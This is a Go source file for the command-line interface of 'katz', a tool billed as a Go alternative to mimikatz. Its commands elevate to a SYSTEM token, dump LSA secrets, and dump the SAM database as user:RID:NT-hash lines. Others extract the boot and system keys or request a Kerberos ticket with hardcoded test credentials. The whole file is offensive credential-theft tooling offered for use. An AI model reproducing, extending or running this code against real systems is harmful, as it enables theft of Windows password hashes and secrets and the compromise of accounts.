package cli

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"

	katz_modules "katz/katz/modules"
	test "katz/katz/modules/kerb"
	katz_utils "katz/katz/utils"

	"github.com/spf13/cobra"
)

var rootCmd = &cobra.Command{
	Use: "katz.exe",
	Short: "Go go gadget katz!",
	Long: `A go alternative to mimikatz.exe`,
}
const banner = `
  /\_/\  (    ██╗  ██╗ █████╗ ████████╗███████╗
 ( ^.^ ) _)   ██║ ██╔╝██╔══██╗╚══██╔══╝╚══███╔╝
   \"/"  (     █████╔╝ ███████║   ██║     ███╔╝ 
 ( | | )      ██╔═██╗ ██╔══██║   ██║    ███╔╝  
(__d b__)      ██║  ██╗██║  ██║   ██║   ███████╗
               ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝`


var testCmd = &cobra.Command{
	Use: "test",
	Short: "run test code",
	Run: func (cmd *cobra.Command, args []string)  {
		tick, _ := test.TGT("test.local", "Administrator", "password")
		

		fmt.Println(base64.StdEncoding.EncodeToString(tick[10:]))

	},
}
var lsa = &cobra.Command{
	Use: "lsa",
	Short: "do something with the LSA database",
	Run: func (cmd *cobra.Command, args []string) {
		dump, _ := cmd.Flags().GetBool("dump")
		history, _ := cmd.Flags().GetBool("history")
		output := ""
		nonvistastyle, _ := cmd.Flags().GetBool("nonvistastyle")
		nonvistastyle = !nonvistastyle
		if dump != false {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			
			bootKey, err := katz_modules.GetBootKey(token)
			secrets, err := katz_modules.DumpLSASecrets(token, bootKey, nonvistastyle, history)
			for index := range secrets {
				output += secrets[index].PrintSecret() + "\n"
			}
		}else {
			cmd.Help()
			return
		}
		fmt.Println(output)
	},
}

var sam = &cobra.Command{
	Use: "sam",
	Short: "do something with the SAM database",
	Run: func(cmd *cobra.Command, args []string) {
		var output string
		dump, _ := cmd.Flags().GetBool("dump")
		getbootKey, _ := cmd.Flags().GetBool("bootKey")
		getsysKey, _ := cmd.Flags().GetBool("sysKey")
		
		if dump == true {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			data, err := katz_modules.DumpSAM(token)
			if err != nil {
				fmt.Println(err)
				return
			}
			var formatted []string

			for _, d := range data {
				rid := d.Rid
					Name := d.Name
					nt := d.Nthash
					d_str := fmt.Sprintf("%s:%d:%s", Name, rid, nt)
					d_str = strings.Replace(d_str, " ", "", -1)
					if d_str != ":0:"{
						formatted = append(formatted, d_str)
					}
			}
			output = strings.Join(formatted[:], "\n")
		}else if getbootKey == true {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			data, err := katz_modules.GetBootKey(token)
			if err != nil {
				fmt.Println(err)
				return
			}
			output += "0x" + hex.EncodeToString(data)
		}else if getsysKey == true {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			data, err := katz_modules.GetSysKey(token)
			if err != nil {
				fmt.Println(err)
				return
			}
			output += data
		}else {
			cmd.Help()
			return
		}
	fmt.Println(output)

	},
}

func PrintBanner(){
	fmt.Println(banner)
}
func Init() {
	fmt.Println(banner)
	lsa.Flags().Bool("dump", false, "dump lsa database")
	lsa.Flags().Bool("history", false, "get lsa history")
	lsa.Flags().Bool("nonvistastyle", false, "non vista style?")
	sam.Flags().Bool("dump", false, "dump sam database")
	sam.Flags().Bool("bootKey", false, "get boot key")
	sam.Flags().Bool("sysKey", false, "get system key")

	rootCmd.AddCommand(sam)
	rootCmd.AddCommand(testCmd)
	rootCmd.AddCommand(lsa)
	rootCmd.Execute()
}